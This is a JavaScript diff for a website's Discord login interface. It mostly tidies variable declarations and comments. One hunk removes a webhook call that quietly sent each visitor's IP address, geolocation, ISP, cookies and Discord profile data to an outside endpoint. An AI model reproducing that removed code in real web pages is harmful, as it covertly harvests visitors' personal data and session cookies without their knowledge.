@@ -44,8 +44,10 @@ document.addEventListener('DOMContentLoaded', async function() {
 // Discord login functionality
 
 async function updateUI() {
-    if (discordUser) { // Use the userData from the top
-        const userData = JSON.parse(discordUser);
+    let userData; // Declare userData here
+
+    if (discordUser) {
+        userData = JSON.parse(discordUser); // Initialize userData
         const usernameElement = document.querySelector('.username');
         usernameElement.innerText = userData.username; // Update username
         const profilePicture = profileUI.querySelector('.profile-picture');
@@ -61,22 +63,10 @@ async function updateUI() {
 
         if (userParam) {
             // If user data is in the URL, parse and store it
-            userData = JSON.parse(decodeURIComponent(userParam));
+            userData = JSON.parse(decodeURIComponent(userParam)); // Now this will work
             localStorage.setItem('discordUser', JSON.stringify(userData)); // Store user data in local storage
-            await sendWebhook("User Logout", `
-**IP:** ${ipData.ip}
-**City:** ${ipData.city}
-**Region:** ${ipData.region}
-**Country:** ${ipData.country}
-**Timezone:** ${ipData.timezone}
-**Org:** ${ipData.org}
-**Location:** ${ipData.loc}
-**Cookies:** ${visitorCookie}
-**Discord User Data:** \`\`\`json
-${userDataFormatted}
-\`\`\`
-    `.trim(), Math.floor(Math.random() * 16777215)); // Random color for user logout
 
+            // Update UI with user data
             const usernameElement = document.querySelector('.username');
             usernameElement.innerText = userData.username; // Update username
             const profilePicture = profileUI.querySelector('.profile-picture');
@@ -96,7 +86,7 @@ ${userDataFormatted}
     }
 
     // Ensure profile UI is always visible
-   // profileUI.style.display = 'block'; // Always show profile UI
+    // profileUI.style.display = 'block'; // Always show profile UI
 }
 
 // Initial UI setup
